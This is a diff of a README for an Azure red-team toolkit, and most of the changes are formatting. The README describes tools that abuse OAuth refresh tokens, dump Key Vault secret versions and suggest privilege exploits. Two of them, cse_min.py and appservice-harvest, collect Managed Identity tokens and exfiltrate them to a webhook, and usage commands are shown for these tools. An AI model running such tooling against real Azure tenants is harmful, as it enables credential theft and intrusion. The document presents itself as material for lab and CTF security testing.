@@ -19,7 +19,6 @@ Use a single `refresh_token` to mint multiple `access_token`s across different A
 - Useful in phishing/OAuth abuse scenarios like AzRTE labs
 
 #### Example Usage
-
 ```bash
 python token_multiplexer.py \
   --refresh-token "<paste_here>" \
@@ -32,11 +31,11 @@ python token_multiplexer.py \
 
 This script enumerates secrets in Azure Key Vaults and retrieves all available versions, including old values that might remain after rotation.
 
-Features
--	Works on a single vault or all vaults in a subscription.
--	Dumps all secret versions with flags for which one is latest.
--	Supports table view (human-friendly) and JSON output (machine-friendly).
--	Flags old values that differ from the latest version.
+#### Features
+- Works on a single vault or all vaults in a subscription.
+- Dumps all secret versions with flags for which one is latest.
+- Supports table view (human-friendly) and JSON output (machine-friendly).
+- Flags old values that differ from the latest version.
 
 #### Usage
 ```bash
@@ -48,19 +47,22 @@ python3 kv-dump-old-versions.py --vault kv-1-2e693029 --output json
 ```
 
 ### 🔢 kv-rsa-decrypt.py
-Tries common RSA algs against a given Key Vault key ID. Uses az under the hood to leverage existing logon.
+
+Tries common RSA algorithms against a given Key Vault key ID. Uses `az` under the hood to leverage existing logon.
 
 #### Usage
 ```bash
 python3 kv-rsa-decrypt.py \
   --key-id "https://kv-2-xxxx.vault.azure.net/keys/key-2-xxxx/<version>" \
   --ciphertext-b64 "G067ensX6Zgz...=="  # full base64 blob
+
 # or force a specific algo:
 python3 kv-rsa-decrypt.py --key-id ... --ciphertext-b64 ... --algo RSA-OAEP
 ```
 
 ### 🗑️ kv-recover-deleted.py
-List+recover deleted secrets for a vault
+
+List and recover deleted secrets for a vault.
 
 #### Usage
 ```bash
@@ -69,17 +71,18 @@ python3 kv-recover-deleted.py --vault kv-3-2e693029 --recover-all
 ```
 
 ### 🔍 role-attack-surf.py
--	Lists your role assignments at a given scope (vault/RG/subscription)
--	Pulls each role definition
--	Flags interesting Actions/DataActions (stuff that tends to be abusable)
--	Prints a summary + optional JSON
--	Suggests quick exploits (e.g., set-policy when it sees accessPolicies/write)
+
+- Lists your role assignments at a given scope (vault/RG/subscription)
+- Pulls each role definition
+- Flags interesting Actions/DataActions (stuff that tends to be abusable)
+- Prints a summary + optional JSON
+- Suggests quick exploits (e.g., `set-policy` when it sees `accessPolicies/write`)
 
 #### Usage
 ```bash
 # At a vault scope (like your lab)
 python3 role-attack-surf.py \
-  --scope "/subscriptions/<sub>/resourceGroups/key-vault-labs/providers/Microsoft.KeyVault/vaults/<vault>""
+  --scope "/subscriptions/<sub>/resourceGroups/key-vault-labs/providers/Microsoft.KeyVault/vaults/<vault>"
 
 # Filter to your SP only (faster to read)
 python3 role-attack-surf.py \
@@ -91,7 +94,8 @@ python3 role-attack-surf.py --scope "/subscriptions/<sub>" --json
 ```
 
 ### ﹟psenc.py
-Output Powershell-read -EncodedCommand string given a file, command, or stdin
+
+Output PowerShell `-EncodedCommand` string given a file, command, or stdin.
 
 #### Usage
 ```bash
@@ -106,6 +110,7 @@ echo '$PSVersionTable.PSVersion' | python3 psenc.py --stdin
 ```
 
 ### 🕸️ cse_min.py
+
 Trigger the Azure CustomScriptExtension on a Windows VM to run a PowerShell payload that collects Managed Identity tokens (ARM + Key Vault) and exfiltrates them to a specified webhook.
 
 #### Usage
@@ -122,12 +127,11 @@ python3 cse_min.py -g <resource-group> -n <vm-name> \
 python3 cse_min.py -g <resource-group> -n <vm-name> -w <webhook-url> --show
 ```
 
-This will:
-	1.	Build the PowerShell payload to grab ARM + Key Vault access tokens via IMDS.
-	2.	Encode it to UTF-16LE Base64 for -EncodedCommand execution.
-	3.	Deploy it to the target VM via Azure CLI az vm extension set with CustomScriptExtension.
-	4.	POST results to the given webhook.
-
+**This will:**
+1. Build the PowerShell payload to grab ARM + Key Vault access tokens via IMDS.
+2. Encode it to UTF-16LE Base64 for `-EncodedCommand` execution.
+3. Deploy it to the target VM via Azure CLI `az vm extension set` with `CustomScriptExtension`.
+4. POST results to the given webhook.
 
 ### 📦 az-vars.sh
 
@@ -142,15 +146,28 @@ az postgres flexible-server list -o json | bash az-vars.sh
 az postgres flexible-server list -o json | ./az-vars.sh
 ```
 
-This will:
-	1.	Parse JSON input from stdin (e.g., az <resource> list -o json).
-	2.	Extract commonly used fields like id, name, resourceGroup, location, fqdn.
-	3.	Export each as an environment variable (e.g., $AZ_NAME, $AZ_RG).
-	4.	Print them in VAR=value form for quick copy/paste into other commands.
+**This will:**
+1. Parse JSON input from stdin (e.g., `az <resource> list -o json`).
+2. Extract commonly used fields like `id`, `name`, `resourceGroup`, `location`, `fqdn`.
+3. Export each as an environment variable (e.g., `$AZ_NAME`, `$AZ_RG`).
+4. Print them in `VAR=value` form for quick copy/paste into other commands.
 
+---
 
-⚠️ Disclaimer
+## 🛠 Additional Tools
 
-For educational and lab use only.
+### appservice-harvest
 
+Deploy a custom container to Azure App Service to harvest Managed Identity tokens and optionally execute remote commands.
+
+- Supports System-Assigned and User-Assigned MIs
+- Collects ARM + Key Vault tokens
+- Exfiltrates via a configurable webhook URL
+
+**See:** [`appservice-harvest/README.md`](./appservice-harvest/README.md) for full details, setup, and usage instructions.
+
+---
+
+⚠️ **Disclaimer**  
+For educational and lab use only.  
 Do not use these tools without explicit permission. They are intended to support self-hosted labs, CTF environments, and ethical security testing.
